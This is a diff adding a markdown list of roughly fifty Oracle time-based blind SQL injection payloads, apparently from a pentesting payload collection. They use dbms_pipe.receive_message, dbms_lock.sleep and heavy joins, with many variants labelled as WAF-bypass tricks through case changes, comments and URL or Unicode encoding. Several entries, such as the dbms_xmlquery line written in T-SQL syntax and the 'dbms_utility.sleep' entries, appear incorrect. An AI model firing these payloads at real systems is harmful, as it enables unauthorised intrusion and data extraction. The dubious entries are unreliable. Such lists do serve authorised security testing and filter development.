@@ -1,0 +1,103 @@
+# Oracle Database
+
+These payloads cause time delays to prove interaction via injection. Variations include case changes, comments, encodings (URL, double URL, Unicode), inline spaces/comments, and WAF bypass tricks like nested functions or heavy computations.
+
+- **' AND dbms_pipe.receive_message('a',5)=0 --**  
+  Standard pipe receive for 5-second delay.
+- **'||dbms_pipe.receive_message('a',5) --**  
+  Concatenation-based pipe delay.
+- **' AND 1=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4 WHERE ROWNUM=1) --**  
+  Heavy cross-join count for computation delay.
+- **' AND (CASE WHEN 1=1 THEN dbms_pipe.receive_message('a',5) ELSE 0 END)=0 --**  
+  Conditional pipe delay.
+- **' aNd DbMs_PiPe.ReCeIvE_MeSsAgE('a',5)=0 --**  
+  Case variation to bypass WAF.
+- **'/*comment*/AND/*comment*/dbms_pipe.receive_message('a',5)=0 --**  
+  Inline comments for WAF bypass.
+- **' AND dbms_pipe.receive_message(chr(97),5)=0 --**  
+  CHR function encoding for 'a'.
+- **%27%20AND%20dbms_pipe.receive_message(%27a%27,5)=0%20--**  
+  URL-encoded payload.
+- **%2527%20AND%20dbms_pipe.receive_message(%2527a%2527,5)=0%20--**  
+  Double URL-encoded payload.
+- **\u0027 AND dbms_pipe.receive_message(\u0027a\u0027,5)=0 --**  
+  Unicode-encoded single quote.
+- **' AND dbms_lock.sleep(5) --**  
+  Standard lock sleep for 5 seconds.
+- **'||dbms_lock.sleep(5) --**  
+  Concat lock sleep.
+- **' AND (SELECT dbms_lock.sleep(5) FROM dual)=0 --**  
+  Subquery lock sleep.
+- **' aNd DbMs_LoCk.SlEeP(5) --**  
+  Case variation lock sleep.
+- **'/*foo*/AND/*bar*/dbms_lock.sleep(5) --**  
+  Nested comments WAF bypass.
+- **%27%20AND%20dbms_lock.sleep(5)%20--**  
+  URL-encoded lock sleep.
+- **%2527%20AND%20dbms_lock.sleep(5)%20--**  
+  Double URL lock sleep.
+- **\u0027 AND dbms_lock.sleep(5) --**  
+  Unicode lock sleep.
+- **' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT 'a' FROM dual WHERE dbms_pipe.receive_message('a',5)=1)) --**  
+  UTL_INADDR nested pipe delay.
+- **' AND (SELECT COUNT(*) FROM sys.all_objects a, sys.all_objects b WHERE 1=1 AND ROWNUM<100000) --**  
+  Heavy object count computation.
+- **'|| (SELECT dbms_pipe.receive_message(CHR(65),5) FROM dual) --**  
+  CHR concat pipe delay.
+- **' AND dbms_pipe . receive_message('a',5)=0 --**  
+  Inline spaces WAF bypass.
+- **' AND/**/dbms_pipe.receive_message('a',5)=0 --**  
+  Comment-wrapped function.
+- **' AND dbms_pipe.receive_message('a'/**/,5)=0 --**  
+  Parameter comment bypass.
+- **' AND 1=(dbms_pipe.receive_message('a',5)) --**  
+  Direct pipe assignment.
+- **' OR dbms_pipe.receive_message('a',5)=0 --**  
+  OR-based pipe delay.
+- **%27%20OR%20dbms_pipe.receive_message(%27a%27,5)=0 --**  
+  URL-encoded OR pipe.
+- **' AND dbms_utility.sleep(5) --**  
+  Utility sleep function.
+- **'||dbms_utility.sleep(5) --**  
+  Concat utility sleep.
+- **' AND (CASE WHEN TRUE THEN dbms_lock.sleep(5) ELSE FALSE END) --**  
+  Boolean conditional sleep.
+- **' AND dbms_xmlquery.newcontext('declare @q varchar(99) set @q=(SELECT 1) exec (@q)') --**  
+  XML query nested execution delay.
+- **' AND 1=CTXSYS.CTX_MKUNPK(SQL_QUERY) --**  
+  CTXSYS heavy unpack computation.
+- **' AND dbms_pipe.receive_message('a',10) --**  
+  Longer 10-second pipe delay.
+- **' AND (SELECT 1 FROM dual WHERE dbms_pipe.receive_message('a',5)>0) --**  
+  WHERE clause pipe.
+- **\u0027\u0020AND\u0020dbms_pipe.receive_message(\u0027a\u0027,5)=0 --**  
+  Unicode with spaces.
+- **%27+AND+dbms_pipe.receive_message('a',5)=0+--**  
+  Plus-space URL variant.
+- **' AND dbms_pipe.receive_message(/*a*/'a',5)=0 --**  
+  Comment in parameter.
+- **' AND dbms_pipe.receive_message('a'-- ,5)=0**  
+  Inline comment in param.
+- **' AND 1=(SELECT dbms_pipe.receive_message('a',5) FROM dual WHERE 1=1) --**  
+  Subselect pipe.
+- **' OR (dbms_lock.sleep(5))=0 --**  
+  OR lock sleep.
+- **%2527%2520AND%2520dbms_lock.sleep(5)%2520--**  
+  Double URL lock.
+- **' AND dbms_pipe.receive_message(concat('a'),5)=0 --**  
+  CONCAT nested pipe.
+- **' AND sys.dbms_lock.sleep(5) --**  
+  SYS schema lock sleep.
+- **' AND (dbms_pipe.receive_message('a',5)) IS NULL --**  
+  IS NULL pipe check.
+- **' AND 1=1; dbms_lock.sleep(5); --**  
+  Stacked sleep (if enabled).
+- **' UNION SELECT dbms_pipe.receive_message('a',5) FROM dual --**  
+  UNION pipe delay.
+- **' HAVING dbms_pipe.receive_message('a',5)=0 --**  
+  HAVING clause pipe.
+- **' GROUP BY dbms_pipe.receive_message('a',5) --**  
+  GROUP BY pipe.
+- **' ORDER BY dbms_pipe.receive_message('a',5) --**  
+  ORDER BY pipe delay.
+
